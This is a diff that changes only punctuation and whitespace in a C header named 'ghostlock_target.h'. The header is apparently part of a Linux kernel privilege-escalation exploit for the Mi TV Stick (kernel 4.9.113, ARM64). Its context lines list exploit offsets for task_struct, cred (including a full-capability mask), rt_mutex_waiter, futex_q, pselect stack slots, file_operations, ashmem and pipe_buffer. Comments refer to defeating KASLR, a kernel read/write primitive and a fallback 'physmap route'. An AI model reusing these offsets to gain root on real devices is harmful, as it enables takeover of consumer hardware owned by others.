@@ -1,5 +1,5 @@
 /*
- * ghostlock_target.h — aquaman (Mi TV Stick 1080p, 4.9.113 SMP PREEMPT armv8l)
+ * ghostlock_target.h - aquaman (Mi TV Stick 1080p, 4.9.113 SMP PREEMPT armv8l)
  *
  * SOURCE OF EVERY OFFSET: DWARF from the lab build
  *   build-aq/vmlinux  (McMCCRU/linux-amlogic 3d4ab79e, meson64_defconfig + 2
@@ -8,7 +8,7 @@
  * build-aq is NEITHER the PI.2055 source NOR the PI.2055 binary. Every number
  * here is INFERRED until validated by a runtime read (post-R/W) or by
  * calibration on the device. The numbers come from an ARM64 4.9.113 build with
- * the same toolchain, so the geometry is the best available guess — but a
+ * the same toolchain, so the geometry is the best available guess - but a
  * GUESS, not fact.
  *
  * Copying numbers from other devices is FORBIDDEN:
@@ -38,7 +38,7 @@
 #define GL_TEXT_OFF_MAX          0x01000000ULL           /* 16 MB KASLR window */
 
 /* ------------------------------------------------------------------ */
-/* 1. rt_mutex_waiter — CONFIRMED by the lab DWARF                     */
+/* 1. rt_mutex_waiter - CONFIRMED by the lab DWARF                     */
 /*    (rtmutex_common.h, no CONFIG_DEBUG_RT_MUTEXES)                    */
 /* ------------------------------------------------------------------ */
 #define GL_RTMW_SIZE             0x50
@@ -60,7 +60,7 @@
 #define GL_RTMW_TASK_OFF_FROM_PI_ENTRY  0x18
 
 /* ------------------------------------------------------------------ */
-/* 2. task_struct — size 0xdc0                                         */
+/* 2. task_struct - size 0xdc0                                         */
 /* ------------------------------------------------------------------ */
 #define GL_TASK_SIZE             0xdc0
 #define GL_TASK_STATE            0x018
@@ -89,7 +89,7 @@
 #define GL_TASK_PI_BLOCKED_ON    0x7f0   /* struct rt_mutex * */
 
 /* ------------------------------------------------------------------ */
-/* 3. cred — size 0xa8, DEBUG_CREDENTIALS unset (aquaman-config)       */
+/* 3. cred - size 0xa8, DEBUG_CREDENTIALS unset (aquaman-config)       */
 /* ------------------------------------------------------------------ */
 #define GL_CRED_SIZE             0xa8
 #define GL_CRED_UID              0x04
@@ -113,7 +113,7 @@
 #define GL_CAP_FULL              0x000001ffffffffffULL
 
 /* ------------------------------------------------------------------ */
-/* 4. rt_mutex — size 0x20                                             */
+/* 4. rt_mutex - size 0x20                                             */
 /* ------------------------------------------------------------------ */
 #define GL_RTMUTEX_SIZE          0x20
 #define GL_RTMUTEX_WAIT_LOCK     0x00
@@ -122,7 +122,7 @@
 #define GL_RTMUTEX_OWNER         0x18   /* struct task_struct * */
 
 /* ------------------------------------------------------------------ */
-/* 5. futex_q — size 0x70 (only for reading q->rt_waiter)               */
+/* 5. futex_q - size 0x70 (only for reading q->rt_waiter)               */
 /* ------------------------------------------------------------------ */
 #define GL_FUTEXQ_SIZE           0x70
 #define GL_FUTEXQ_LIST           0x00
@@ -177,7 +177,7 @@
  * 6 slots of 40B = 240B = 0xF0, fitting in 0x90..0x180 (frame = 0x190).
  *
  * Slots (measured in the asm):
- *   [0] rinp   <- copy_from_user( in     )  user content
+ *   [0] rinp   <- copy_from_user( in )  user content
  *   [1] routp  <- copy_from_user( out    )  user content
  *   [2] rexp   <- copy_from_user( except )  user content
  *   [3] res_in  <- memset(0)
@@ -216,7 +216,7 @@
 #define GL_PSELECT_SHIFT_MAX      0x01c0UL
 
 /* ------------------------------------------------------------------ */
-/* 7. mm_struct — SLUB, cache dedicado "mm_struct"                       */
+/* 7. mm_struct - SLUB, cache dedicado "mm_struct"                       */
 /*    sizeof 0x338 (LAB_DERIVED: DWARF build-aq/vmlinux, guards em       */
 /*    mm_types.h conferem entre aquaman-config e build-aq/.config)       */
 /*    stride 0x340 (LAB_DERIVED: ALIGN(0x338,64) em slab_common.c:304 +  */
@@ -250,7 +250,7 @@
 #define GL_MM_CACHE_NAME         "mm_struct"
 
 /* ------------------------------------------------------------------ */
-/* 8. configfs_buffer — size 0x60, mutex em +0x20 (LP64)                */
+/* 8. configfs_buffer - size 0x60, mutex em +0x20 (LP64)                */
 /* ------------------------------------------------------------------ */
 #define GL_CFBUF_SIZE            0x60
 #define GL_CFBUF_COUNT           0x00   /* loff_t */
@@ -272,7 +272,7 @@
 #define GL_MUTEX_SIZE            0x18   /* struct mutex */
 
 /* ------------------------------------------------------------------ */
-/* 9. file_operations — size 0xf0 (VA39 LP64, este 4.9 tem read_iter)   */
+/* 9. file_operations - size 0xf0 (VA39 LP64, este 4.9 tem read_iter)   */
 /* ------------------------------------------------------------------ */
 #define GL_FOPS_SIZE             0xf0
 #define GL_FOPS_OWNER            0x00
@@ -306,7 +306,7 @@
 #define GL_FDTABLE_FD            0x08
 
 /* ------------------------------------------------------------------ */
-/* 11. ashmem_area — size 0x138                                        */
+/* 11. ashmem_area - size 0x138                                        */
 /*     name[] spans 0x00..0x10f (len 0x10c, padded to 0x110)           */
 /* ------------------------------------------------------------------ */
 #define GL_ASHMEM_AREA_SIZE      0x138
@@ -321,7 +321,7 @@
 #define GL_ASHMEM_DEV            "/dev/ashmem"
 
 /* ------------------------------------------------------------------ */
-/* 12. pipe_buffer — size 0x28 (plan B, physmap route)                  */
+/* 12. pipe_buffer - size 0x28 (plan B, physmap route)                  */
 /* ------------------------------------------------------------------ */
 #define GL_PIPEBUF_SIZE          0x28
 #define GL_PIPEBUF_PAGE          0x00   /* struct page * */
